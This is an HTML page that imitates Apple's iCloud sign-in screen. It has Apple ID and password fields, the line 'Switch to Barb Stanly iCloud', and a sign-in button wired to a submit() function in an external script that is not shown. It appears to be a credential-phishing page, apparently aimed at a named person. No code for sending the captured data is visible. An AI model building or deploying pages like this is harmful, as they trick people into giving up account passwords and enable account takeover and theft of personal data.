<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/main.css">
    <title>iCloud</title>
</head>

<style>
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
      -webkit-user-select: none;
      -moz-user-select: none;
      user-select: none;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 3.5rem;
      }
    }
  </style>
<body class="text-center">
    <main class="form-signin">
        <!-- <form> -->
          <img class="mb-4" src="img/cloud.png" alt="" width="100" height="100">
          <h1 class="h3 mb-3 fw-normal">Please sign in</h1>
          <span>Switch to Barb Stanly iCloud</span>

          <i><div id="message"></div></i>
      
          <div class="form-floating">
            <input type="text" class="form-control" id="id" placeholder="name@example.com">
            <label for="id">Apple Id</label>
          </div>
          <div class="form-floating">
            <input type="password" class="form-control" id="pass" placeholder="Password">
            <label for="pass">Password</label>
          </div>
      
          <div class="checkbox mb-3">
            <label>
              <input type="checkbox" value="remember-me"> Keep me signed in
            </label>
          </div>
          <button class="w-100 btn btn-lg btn-primary" type="" onclick="submit()">Sign in</button>
          <p class="mt-5 mb-3 text-muted">&copy; 2017â€“2021</p>
        <!-- </form> -->
      </main>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/main.js"></script>
</body>
</html>
